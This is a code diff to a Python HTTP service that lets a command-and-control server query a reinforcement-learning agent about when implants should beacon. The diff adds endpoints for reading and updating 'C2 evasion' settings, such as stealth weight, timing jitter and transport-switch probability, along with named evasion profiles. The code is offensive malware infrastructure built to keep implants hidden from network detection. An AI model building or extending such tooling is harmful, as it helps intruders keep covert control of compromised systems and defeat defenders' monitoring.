@@ -1,8 +1,10 @@
 """
-RL Beacon Service - HTTP API for beacon timing decisions
+RL Beacon Service - HTTP API for beacon timing decisions with C2 evasion
 
 Exposes the RL agent as a simple HTTP API that the C2 server can query.
 Listens on localhost:5555 by default.
+
+Evasion tuning: Query /evasion/config to see/update detection evasion parameters
 """
 
 import asyncio
@@ -10,6 +12,13 @@ import json
 from aiohttp import web
 from rl_beacon_agent import get_agent, BeaconRLAgent
 import torch
+
+try:
+    from rl_evasion_config import EvasionConfig, EVASION_PROFILES, apply_profile
+except ImportError:
+    EvasionConfig = None
+    EVASION_PROFILES = {}
+    def apply_profile(name): return False
 
 
 class BeaconService:
@@ -27,6 +36,9 @@ class BeaconService:
         self.app.router.add_post("/beacon/feedback", self.feedback_beacon)
         self.app.router.add_get("/model/metrics", self.get_metrics)
         self.app.router.add_post("/model/train", self.train_step)
+        self.app.router.add_get("/evasion/config", self.get_evasion_config)
+        self.app.router.add_post("/evasion/config", self.set_evasion_config)
+        self.app.router.add_get("/evasion/profiles", self.get_evasion_profiles)
 
     async def get_beacon_action(self, request):
         """Get beacon action for an implant
@@ -125,6 +137,61 @@ class BeaconService:
             })
         except Exception as e:
             return web.json_response({"error": str(e)}, status=400)
+
+    async def get_evasion_config(self, request):
+        """Get C2 evasion configuration
+
+        GET /evasion/config
+        """
+        if EvasionConfig is None:
+            return web.json_response({"error": "Evasion config not available"}, status=400)
+
+        return web.json_response(EvasionConfig.to_dict())
+
+    async def set_evasion_config(self, request):
+        """Update C2 evasion configuration
+
+        POST /evasion/config
+        {
+            "STEALTH_WEIGHT": 0.7,
+            "JITTER_RANGE": 15,
+            "TRANSPORT_SWITCH_PROB": 0.4
+        }
+        """
+        if EvasionConfig is None:
+            return web.json_response({"error": "Evasion config not available"}, status=400)
+
+        try:
+            data = await request.json()
+            updated = {}
+
+            for key, value in data.items():
+                if EvasionConfig.update(key, value):
+                    updated[key] = value
+                else:
+                    return web.json_response(
+                        {"error": f"Unknown config parameter: {key}"}, status=400
+                    )
+
+            return web.json_response({
+                "updated": updated,
+                "config": EvasionConfig.to_dict(),
+            })
+        except Exception as e:
+            return web.json_response({"error": str(e)}, status=400)
+
+    async def get_evasion_profiles(self, request):
+        """Get available evasion profiles
+
+        GET /evasion/profiles
+        """
+        profiles = {}
+        for name, profile in EVASION_PROFILES.items():
+            profiles[name] = {
+                "description": profile.get("description", ""),
+                "config": {k: v for k, v in profile.items() if k != "description"}
+            }
+        return web.json_response({"profiles": profiles})
 
     async def start(self):
         """Start the service"""
